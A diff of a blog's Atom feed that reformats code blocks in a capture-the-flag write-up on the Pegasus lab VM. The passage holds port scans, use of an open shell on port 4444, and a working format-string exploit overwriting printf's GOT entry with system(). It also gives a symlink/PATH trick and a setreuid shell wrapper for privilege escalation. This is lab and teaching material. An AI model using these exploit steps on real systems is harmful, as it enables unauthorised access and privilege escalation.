@@ -4,7 +4,7 @@
   <title><![CDATA[FourFourFourFour]]></title>
   <link href="http://recrudesce.github.io/atom.xml" rel="self"/>
   <link href="http://recrudesce.github.io/"/>
-  <updated>2015-01-02T00:24:25+00:00</updated>
+  <updated>2015-01-02T00:29:52+00:00</updated>
   <id>http://recrudesce.github.io/</id>
   <author>
     <name><![CDATA[recrudesce]]></name>
@@ -33,7 +33,7 @@
 
 <p>An NMAP scan shows that the VM only has a few ports open that are of interest - 22 and 8088</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -48,21 +48,22 @@
 <span class='line-number'>13</span>
 <span class='line-number'>14</span>
 <span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sS -p- -T5 172.16.231.132
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sS -p- -T5 172.16.231.132
 </span><span class='line'>
-</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-19 13:31 GMT
-</span><span class='line'>Nmap scan report for 172.16.231.132
-</span><span class='line'>Host is up (0.000063s latency).
-</span><span class='line'>Not shown: 65526 closed ports
+</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-12-19 13:31 GMT
+</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.231.132
+</span><span class='line'>Host is up <span class="o">(</span>0.000063s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: <span class="m">65526</span> closed ports
 </span><span class='line'>PORT      STATE SERVICE
 </span><span class='line'>22/tcp    open  ssh
 </span><span class='line'>111/tcp   open  rpcbind
 </span><span class='line'>8088/tcp  open  radan-http
 </span><span class='line'>
-</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 (VMware)
+</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 <span class="o">(</span>VMware<span class="o">)</span>
 </span><span class='line'>
-</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds
-</span><span class='line'>root@kali:~#</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.74 seconds
+</span><span class='line'>root@kali:~#
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>8088, when visited with a browser, shows a lovely picture of a Pegasus. A quick look at the source doesn&rsquo;t reveal anything, and there&rsquo;s nothing hidden in the image file.</p>
@@ -167,17 +168,17 @@
 <span class='line-number'>9</span>
 <span class='line-number'>10</span>
 <span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">p4444</span> <span class="o">-</span><span class="n">T5</span> <span class="mf">172.16.231.132</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sS -p4444 -T5 172.16.231.132
 </span><span class='line'>
-</span><span class='line'><span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">6.47</span> <span class="p">(</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//nmap.org ) at 2014-12-19 13:47 GMT</span>
-</span><span class='line'><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">172.16.231.132</span>
-</span><span class='line'><span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.00040</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
-</span><span class='line'><span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>
-</span><span class='line'><span class="mi">4444</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">krb524</span>
-</span><span class='line'><span class="n">MAC</span> <span class="nl">Address</span><span class="p">:</span> <span class="mo">00</span><span class="o">:</span><span class="mi">0</span><span class="nl">C</span><span class="p">:</span><span class="mi">29</span><span class="o">:</span><span class="nl">E3</span><span class="p">:</span><span class="mi">2</span><span class="nl">A</span><span class="p">:</span><span class="mo">04</span> <span class="p">(</span><span class="n">VMware</span><span class="p">)</span>
+</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-12-19 13:47 GMT
+</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.231.132
+</span><span class='line'>Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span>.
+</span><span class='line'>PORT     STATE SERVICE
+</span><span class='line'>4444/tcp open  krb524
+</span><span class='line'>MAC Address: 00:0C:29:E3:2A:04 <span class="o">(</span>VMware<span class="o">)</span>
 </span><span class='line'>
-</span><span class='line'><span class="n">Nmap</span> <span class="nl">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="n">in</span> <span class="mf">13.04</span> <span class="n">seconds</span>
-</span><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span>
+</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.04 seconds
+</span><span class='line'>root@kali:~#
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -190,13 +191,13 @@
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
 <span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">root</span><span class="err">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="n">nc</span> <span class="o">-</span><span class="n">nv</span> <span class="mf">172.16.231.132</span> <span class="mi">4444</span>
-</span><span class='line'><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">172.16.231.132</span><span class="p">]</span> <span class="mi">4444</span> <span class="p">(</span><span class="o">?</span><span class="p">)</span> <span class="n">open</span>
-</span><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">import</span> <span class="n">pty</span><span class="p">;</span><span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">)</span><span class="err">&#39;</span>
-</span><span class='line'><span class="n">mike</span><span class="err">@</span><span class="nl">pegasus</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">mike</span><span class="err">$</span> <span class="n">id</span>
-</span><span class='line'><span class="n">id</span>
-</span><span class='line'><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">mike</span><span class="p">)</span>
-</span><span class='line'><span class="n">mike</span><span class="err">@</span><span class="nl">pegasus</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">mike</span><span class="err">$</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -nv 172.16.231.132 4444
+</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.16.231.132<span class="o">]</span> <span class="m">4444</span> <span class="o">(</span>?<span class="o">)</span> open
+</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span><span class='line'>mike@pegasus:/home/mike<span class="nv">$ </span>id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span>
+</span><span class='line'>mike@pegasus:/home/mike<span class="err">$</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -206,101 +207,155 @@
 
 <p>So as user &ldquo;mike&rdquo;, I started poking around in the setuid binary &ldquo;my_first&rdquo;. It seemed to be some sort of C program with several functions:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ ./my_first</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>./my_first
+</span><span class='line'>WELCOME TO MY FIRST TEST PROGRAM
+</span><span class='line'>--------------------------------
+</span><span class='line'>Select your tool:
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> Calculator
+</span><span class='line'><span class="o">[</span>2<span class="o">]</span> String replay
+</span><span class='line'><span class="o">[</span>3<span class="o">]</span> String reverse
+</span><span class='line'><span class="o">[</span>4<span class="o">]</span> Exit
+</span><span class='line'><span class="o">[</span>/plain<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>The mail in /var/mail/mike mentions a git repo with the <span class="nb">source </span>code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I <span class="k">then</span> went <span class="k">for</span> the calculator, entering:
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>plain <span class="nv">gutter</span><span class="o">=</span><span class="s2">&quot;false&quot;</span><span class="o">]</span>
+</span><span class='line'>Selection: 1
+</span><span class='line'>
+</span><span class='line'>Enter first number: 5
+</span><span class='line'>Enter second number: AAAA
+</span><span class='line'>Error details: AAAA
+</span></code></pre></td></tr></table></div></figure>
 
-<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>
-
-<p>Select your tool:
-[1] Calculator
-[2] String replay
-[3] String reverse
-[4] Exit
-[/plain]</p>
-
-<p>The mail in /var/mail/mike mentions a git repo with the source code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I then went for the calculator, entering:</p>
-
-<p>[plain gutter=&ldquo;false&rdquo;]
-Selection: 1</p>
-
-<p>Enter first number: 5
-Enter second number: AAAA
-Error details: AAAA
-[/plain]</p>
 
 <p>That seemed promising. I entered:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-Selection: 1</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Selection: 1
+</span><span class='line'>
+</span><span class='line'>Enter first number: 5
+</span><span class='line'>Enter second number: %x
+</span><span class='line'>Error details: bff1039c
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Enter first number: 5
-Enter second number: %x
-Error details: bff1039c
-[/plain]</p>
 
 <p>And we have our format string vulnerability! The basic idea now was to abuse it and overwrite a got pointer. I chose printf as the target and I wanted to overwrite it with the address of system. ASLR was enabled on pegasus, but because it is a 32 bit box, we can easily &ldquo;fix&rdquo; this with <code>ulimit -s unlimited</code>. This enlarges the stack and fixes the address of libc:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ ulimit -s unlimited
-mike@pegasus:~$ ldd my_first
-    linux-gate.so.1 =>  (0x40022000)
-    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x4002a000)
-    /lib/ld-linux.so.2 (0x40000000)
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
+</span><span class='line'>mike@pegasus:~<span class="nv">$ </span>ldd my_first
+</span><span class='line'>  linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0x40022000<span class="o">)</span>
+</span><span class='line'>  libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0x4002a000<span class="o">)</span>
+</span><span class='line'>  /lib/ld-linux.so.2 <span class="o">(</span>0x40000000<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>Finding the address of system within gdb was trivial. The got pointer address can be found using objdump:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-080483b0 &lt;printf@plt>:
- 80483b0:   ff 25 fc 9b 04 08       jmp    *0x8049bfc
- 80483b6:   68 00 00 00 00          push   $0x0
- 80483bb:   e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c>
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>080483b0 &lt;<span class="nb">printf</span>@plt&gt;:
+</span><span class='line'> 80483b0: ff <span class="m">25</span> <span class="nb">fc </span>9b <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049bfc
+</span><span class='line'> 80483b6: <span class="m">68</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x0</span>
+</span><span class='line'> 80483bb: e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c&gt;
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>So it&rsquo;s at 0x8049bfc. Now we needed to find the start of the format string on the stack. Recrudesce quickly identified it as argument number 8:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-Selection: 1</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Selection: 1
+</span><span class='line'>
+</span><span class='line'>Enter first number: 5
+</span><span class='line'>Enter second number: AAAA%8<span class="nv">$x</span>
+</span><span class='line'>Error details: AAAA41414141
+</span></code></pre></td></tr></table></div></figure>
 
-<p>Enter first number: 5
-Enter second number: AAAA%8$x
-Error details: AAAA41414141
-[/plain]</p>
 
 <p>So I got working on an exploit. I quickly came up with this python script:</p>
 
-<p>[python]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># start calculator thingie</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;1</span><span class="se">\n</span><span class="s">5</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># overwrite first part of got pointer</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049bfe</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%16386c</span><span class="s">%8$hn&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># overwrite second part of got pointer</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049bfc</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%20566c</span><span class="s">%12$hn&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># exit program</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;4</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<h1>!/usr/bin/python</h1>
-
-<p>import struct</p>
-
-<p>def p(x):
-  return struct.pack(&ldquo;&lt;L&rdquo;, x)</p>
-
-<p>payload = &ldquo;&rdquo;</p>
-
-<h1>start calculator thingie</h1>
-
-<p>payload += &ldquo;1\n5\n&rdquo;</p>
-
-<h1>overwrite first part of got pointer</h1>
-
-<p>payload += p(0x8049bfe)
-payload += &ldquo;%16386c%8$hn&rdquo;</p>
-
-<h1>overwrite second part of got pointer</h1>
-
-<p>payload += p(0x8049bfc)
-payload += &ldquo;%20566c%12$hn&rdquo;</p>
-
-<p>payload += &ldquo;\n&rdquo;</p>
-
-<h1>exit program</h1>
-
-<p>payload += &ldquo;4\n&rdquo;
-print payload
-[/python]</p>
 
 <p>The format string first writes some dummy bytes and then overwrites the first part of the got pointer. It takes the 8th argument off the stack and uses %hn to write a half-nibble to that address. The value is the number of bytes that have been written.</p>
 
@@ -308,86 +363,135 @@ print payload
 
 <p>So if we run this exploit, the next time printf() will be called by the binary, it will call system() instead!</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ python exploit.py | ./my_first</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>python exploit.py <span class="p">|</span> ./my_first
+</span><span class='line'>
+</span><span class='line'>...snip...
+</span><span class='line'>
+</span><span class='line'>sh: 1: Selection:: not found
+</span><span class='line'>
+</span><span class='line'>Goodbye!
+</span></code></pre></td></tr></table></div></figure>
 
-<p>&hellip;snip&hellip;</p>
-
-<p>sh: 1: Selection:: not found</p>
-
-<p>Goodbye!
-[/plain]</p>
 
 <p>OK, we have system() being called! So to fully exploit it and grant us a shell, we make a symlink to /bin/dash and call it &ldquo;Selection:&rdquo;. Finally we need to set the PATH environment variable so that the shell searches in the current directory and finds our symlink. The exploit is pushed to the binary via stdin and the cat command then catches the shell that is being spawned (otherwise it closes immediately).</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ ln -s /bin/dash Selection:
-mike@pegasus:~$ export PATH=&ldquo;.:$PATH&rdquo;
-mike@pegasus:~$ ulimit -s unlimited
-mike@pegasus:~$ (python ./exploit.py; cat) | ./my_first</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pegasus:~<span class="nv">$ </span>ln -s /bin/dash Selection:
+</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;.:$PATH&quot;</span>
+</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="nb">ulimit</span> -s unlimited
+</span><span class='line'>mike@pegasus:~<span class="nv">$ </span><span class="o">(</span>python ./exploit.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./my_first
+</span><span class='line'>
+</span><span class='line'>...snip...
+</span><span class='line'>
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<p>&hellip;snip&hellip;</p>
-
-<p>id
-uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
-[/plain]</p>
 
 <p>So we now have a shell as john! I wanted to spawn another shell (using python) to get a pty, but it wouldn&rsquo;t let me:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
-Traceback (most recent call last):
-  File &ldquo;<string>&rdquo;, line 1, in <module>
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 165, in spawn
-    pid, master_fd = fork()
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 107, in fork
-    master_fd, slave_fd = openpty()
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 29, in openpty
-    master_fd, slave_name = <em>open_terminal()
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 70, in </em>open_terminal
-    raise os.error, &lsquo;out of pty devices&rsquo;
-OSError: out of pty devices
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
+</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 165, in spawn
+</span><span class='line'>    pid, <span class="nv">master_fd</span> <span class="o">=</span> fork<span class="o">()</span>
+</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 107, in fork
+</span><span class='line'>    master_fd, <span class="nv">slave_fd</span> <span class="o">=</span> openpty<span class="o">()</span>
+</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 29, in openpty
+</span><span class='line'>    master_fd, <span class="nv">slave_name</span> <span class="o">=</span> _open_terminal<span class="o">()</span>
+</span><span class='line'>  File <span class="s2">&quot;/usr/lib/python2.7/pty.py&quot;</span>, line 70, in _open_terminal
+</span><span class='line'>    raise os.error, <span class="s1">&#39;out of pty devices&#39;</span>
+</span><span class='line'>OSError: out of pty devices
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>This is probably because our little trainee &ldquo;mike&rdquo; is not a real person and is using up all our pty&rsquo;s! No problem, we thought, let&rsquo;s upload our ssh keys&hellip; only that failed, because our gid is set to mike and not john. Hmmm.. I wrote a small C wrapper to try and set gid and uid to 1000 (john) but it wouldn&rsquo;t let me set gid.</p>
 
-<p>[c]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+</span><span class='line'><span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
+</span><span class='line'><span class="n">setregid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">execv</span><span class="p">(</span><span class="s">&quot;/bin/dash&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
+</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
 
-<h1>include &lt;stdio.h></h1>
-
-<h1>include &lt;stdlib.h></h1>
-
-<p>int main(int argc, char *argv[]){
-setreuid(geteuid(), geteuid());
-setregid(geteuid(), geteuid());</p>
-
-<p>execv(&ldquo;/bin/dash&rdquo;, argv);
-return 0;
-}
-[/c]</p>
 
 <p>But this did have the nice side-effect of allowing us a to spawn a pty shell!</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-/tmp/a.out
-id
-uid=1000(john) gid=1001(mike) groups=1000(john),1001(mike)
-python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
-john@pegasus:~$ sudo -l
-sudo -l
-Matching Defaults entries for john on this host:
-    env_reset,
-    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>/tmp/a.out
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
+</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+</span><span class='line'>john@pegasus:~<span class="nv">$ </span>sudo -l
+</span><span class='line'>sudo -l
+</span><span class='line'>Matching Defaults entries <span class="k">for</span> john on this host:
+</span><span class='line'>    env_reset,
+</span><span class='line'>    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span><span class='line'>
+</span><span class='line'>User john may run the following commands on this host:
+</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/sbin/nfs
+</span></code></pre></td></tr></table></div></figure>
 
-<p>User john may run the following commands on this host:
